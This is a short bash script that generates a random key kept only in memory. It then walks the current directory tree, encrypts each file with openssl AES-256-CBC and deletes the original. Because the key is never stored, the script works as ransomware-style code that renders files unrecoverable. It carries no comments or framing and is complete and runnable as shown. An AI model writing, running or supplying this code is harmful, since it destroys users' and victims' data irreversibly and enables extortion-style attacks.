#!/bin/bash
key=$(tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1)
encfile() {
    f=$1
    if [[ "$f" != *".aes"* ]]; then 
        openssl aes-256-cbc -a -salt -in "$f" -out "$f.aes" -k "$key"
        rm "$f"
    fi
}
encdir() {
    for f in "$1"/*; do
        [ -f "$f" ] && encfile "$f"
        [ -d "$f" ] && encdir "$f"
    done
}
encdir "./"